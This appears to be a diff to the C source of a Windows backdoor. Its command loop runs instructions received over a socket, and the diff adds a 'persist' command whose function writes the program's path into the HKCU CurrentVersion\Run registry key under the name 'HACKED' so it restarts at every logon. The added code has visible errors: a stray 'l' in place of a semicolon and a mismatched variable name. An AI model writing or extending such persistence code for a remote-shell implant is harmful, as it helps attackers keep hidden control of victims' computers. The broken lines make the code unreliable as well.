@@ -16,6 +16,35 @@
 // global socket
 int sock;
 
+// win registries
+int bootRun() {
+  char err[128] = "Failed\n";
+  char suc[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+  TCHAR szPath[MAX_PATH]; // max path limitation for Win10 = 256
+  DWORD pathLen = 0; // DWORD - Double Word - unsigned 32bit integer
+  pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); // full path
+  if(pathLen == 0) {
+    send(sock, err, sizeof(err), 0);
+    return -1;
+  }
+  // create registry
+  HKEY NewVal; // handle to an open Registry key
+  if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
+    send(sock, err, sizeof(err), 0);
+    return -1;
+  }
+
+  DWORD pathlenInBytes = pathLen * sizeof(*szPath);
+  if(RegSetValueEx(NewVal,TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+    RegCloseKey(NewVal);
+    send(sock, err, sizeof(err), 0);
+    return -1;
+  }
+  RegCloseKey(NewVal);
+  send(sock, suc, sizeof(suc), 0)l
+  return 0;
+}
+
 // cut for change directory commands
 char *
 str_cut(char str[], int slice_from, int slice_to) {
@@ -80,7 +109,10 @@ void shell() {
     } else if(strncmp("cd ", buffer, 3) == 0) {
       // change directory
       chdir(str_cut(buffer, 3, 100));
-    } else {
+    } else if(strncmp("persist", buffer, 7) == 0) {
+      bootRun();
+    }
+    else {
       // file descriptors
       FILE *fp;
       // run as process - run buffer
